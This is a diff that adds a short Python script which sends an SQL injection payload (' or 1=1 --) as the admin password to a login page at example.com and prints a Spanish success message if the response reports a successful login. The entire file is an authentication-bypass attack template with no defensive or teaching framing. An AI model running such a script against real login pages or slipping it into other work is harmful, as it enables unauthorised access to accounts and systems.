@@ -1,0 +1,11 @@
+import requests
+
+target_url = 'https://www.example.com/login'
+login_data = {
+    'username': 'admin',
+    'password': "' or 1=1 --"
+}
+response = requests.post(target_url, data=login_data)
+
+if 'Login successful' in response.text:
+    print("Inicio de sesión exitoso!")
